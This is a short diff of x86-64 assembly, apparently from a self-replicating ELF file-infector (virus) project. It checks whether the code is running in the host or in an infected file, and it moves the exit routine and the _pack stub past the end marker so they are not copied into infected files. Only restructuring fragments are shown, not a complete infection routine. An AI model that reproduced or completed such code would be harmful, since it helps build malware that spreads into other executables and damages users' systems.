@@ -156,10 +156,8 @@ _end:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jne .infected
 
-	push 60
-	pop rax ; exit
-	xor rdi, rdi; = 0
-	syscall
+	jmp _end_host
+
 
 	.infected:
 		push r8
@@ -608,15 +606,6 @@ _check_file_process:; (string rdi)
 	pop r8
 ret
 
-;               v dest
-_pack: ;(void *rdi) -> ret size + fill rdi
-	push rdx
-
-	lea rsi, [rel _packed_part]
-	lea rdx, [rel _end_of_pack]
-
-	pop rdx
-ret
 
 ; ================================ utils =======================================
 
@@ -815,3 +804,21 @@ _params:
 	entry_prg dq 0x0
 
 _eof:
+
+; don't need to copy the host part
+
+_end_host:
+	push 60
+	pop rax ; exit
+	xor rdi, rdi; = 0
+	syscall
+
+;               v dest
+_pack: ;(void *rdi) -> ret size + fill rdi
+	push rdx
+
+	lea rsi, [rel _packed_part]
+	lea rdx, [rel _end_of_pack]
+
+	pop rdx
+ret
